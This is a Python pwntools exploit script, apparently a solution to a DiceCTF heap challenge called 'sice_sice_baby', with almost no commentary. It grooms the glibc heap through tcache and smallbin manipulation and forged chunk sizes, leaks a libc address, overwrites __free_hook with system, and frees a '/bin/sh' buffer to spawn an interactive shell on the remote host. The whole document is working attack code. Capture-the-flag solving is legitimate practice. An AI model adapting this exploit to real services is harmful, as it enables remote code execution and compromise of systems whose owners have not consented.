from pwn import *

#r = process("./sice_sice_baby", env = {"LD_PRELOAD":"./libc.so.6"})
r = remote("dicec.tf", 31914)
libc = ELF('./libc.so.6')
#gdb.attach(r)
recv_cnt = 0

print r.recvuntil("> ")

def malloc(size):
	global recv_cnt
	r.sendline('1' + '\x00'*18)
	r.sendline(str(size).ljust(19, '\x00'))
	recv_cnt += 2

def free(i):
	global recv_cnt
	r.sendline('2' + '\x00'*18)
	r.sendline(str(i).ljust(19, '\x00'))
	recv_cnt += 2

def edit(i, data):
	global recv_cnt
	r.sendline('3' + '\x00'*18)
	r.sendline(str(i).ljust(19, '\x00'))
	r.send(str(data))
	recv_cnt += 3
	for x in range(recv_cnt):
		print r.recvuntil("> ")
		recv_cnt = 0

def view(i):
	global recv_cnt
	r.sendline('4' + '\x00'*18)
	r.sendline(str(i).ljust(19, '\x00'))
	for x in range(recv_cnt):
		print r.recvuntil("> ")
		recv_cnt = 0
	print r.recvuntil("> ")
	data = r.recvline().strip()
	print r.recvuntil("> ")
	return data

NUM_E = 20
NUM_9 = 20
NUM_F = 20
NUM_A = 20
NUM_C = 20

# 0-19 0xe0
# 20-39 0x90
# 40-59 0xf0
# 60-79 0xa0
# 0-6 tcache
# 20-26 tcache
# 40-46 tcache
# 60-66 tcache

for x in range(NUM_E):
	malloc(0xd8)

for x in range(NUM_9):
	malloc(0x88)

for x in range(NUM_F):
	malloc(0xe8)

for x in range(NUM_A):
	malloc(0x98)

for x in range(NUM_C):
	malloc(0xb8)

for x in range(7):
	free(x)
	free(x + NUM_E)
	free(x + NUM_E + NUM_9)

free(7)
free(8)
free(9)

# 0-3
malloc(0x98)
malloc(0x98)
malloc(0x98)
malloc(0xb8)

for x in range(7):
	free(x + NUM_E + NUM_9 + NUM_F)
	free(x + NUM_E + NUM_9 + NUM_F + NUM_A)

free(NUM_E + 7)
#chunk with lsb 00, size 0xa0
free(2)
free(NUM_E + 9)

free(1)
free(3)

# 1
malloc(0xc8)

# 2-9, 20-25
for x in range(7):
	malloc(0x98)
for x in range(7):
	malloc(0x88)

# use old smallbin chunks... 26-27
malloc(0x88)
malloc(0x88)

# empty unsorted bin... 29, 40
malloc(0x88)
malloc(0x98)

# fill up 0x90 and 0xa0 tcache...
for x in range(8):
	free(2 + x)
for x in range(6):
	free(NUM_E + x)

free(29)
free(40)

# 2
malloc(0x28)

#empty 0xf0 tcache...
# 3-9
for x in range(7):
	malloc(0xe8)

# get 0x100 chunk!
#malloc(0xe8)

free(27)
free(28)

# 20-25, 27
for x in range(7):
	malloc(0xd8)

# 28-29
malloc(0xd8)
malloc(0xa8)

edit(29, 'A'*0x88 + p64(0x91))

# 40
malloc(0x68)

# fill up 0xe0 tcache again...
for x in range(6):
	free(20 + x)
free(27)


# 20-25, 27, 41
for x in range(8):
	malloc(0x88)

for x in range(6):
	free(20 + x)
#free(27)
free(41)

free(26)
free(28)
free(27)

# 20-22
malloc(0xe8)

malloc(0xa8)
edit(21, 'B'*0x88 + p64(0x91) + 'B'*8)
malloc(0x68)

# 23-28, 41-46, 60-66, 80-82
for x in range(21):
	malloc(0xa8)
malloc(0x18)

for x in range(7):
	free(60 + x)


# fill up 0x100 tcache
free(23)
free(24)
malloc(0x58)
malloc(0xe8)

free(25)
free(26)
malloc(0x58)
malloc(0xe8)

free(27)
free(28)
malloc(0x58)
malloc(0xe8)

free(41)
free(42)
malloc(0x58)
malloc(0xe8)

free(43)
free(44)
malloc(0x58)
malloc(0xe8)

free(45)
free(46)
malloc(0x58)
malloc(0xe8)

free(80)
free(81)
malloc(0x58)
malloc(0xe8)

# fill up 0x100 tcache
free(24)
free(26)
free(28)
free(42)
free(44)
free(46)
free(61)

edit(2, 'C'*32 + p64(0x60))
edit(1, 'B'*0x98 + '\x61\x00\x00\x00')

free(20)

# 20, 24
malloc(0x18)
malloc(0x18)
edit(24, "Z"*8 + p64(0x51))

# 26, 28, 42, 44, 46, 61, 62
for x in range(7):
	malloc(0xa8)

# 63, 10, 64, 65
malloc(0xa8)
free(10)
malloc(0xa8)
malloc(0x48)
malloc(0x48)

free(64)
free(2)

edit(24, "Z"*8 + p64(0x51))

# fill up 0xb0 tcache omegalul
# 2, 64, 66, 80-81, 83-84
for x in range(7):
	malloc(0xa8)
free(2)
free(64)
free(66)
free(80)
free(81)
free(83)
free(84)

# 2, 64
malloc(0x48)
malloc(0x48)

edit(64, 'A'*8)

free(10)

libc_leak = u64(view(64) + '\x00'*2)
print hex(libc_leak)
libc_base = libc_leak - 0x1eabe0
print hex(libc_base)

free(65)
free(2)

edit(24, 'A'*8 + p64(0x51) + p64(libc_base + libc.symbols['__free_hook']))

# 2, 10
malloc(0x48)
malloc(0x48)
edit(10, p64(libc_base + libc.symbols['system']))
edit(2, '/bin/sh\x00')

# get shell
r.sendline('2')
r.sendline('2')

r.interactive()

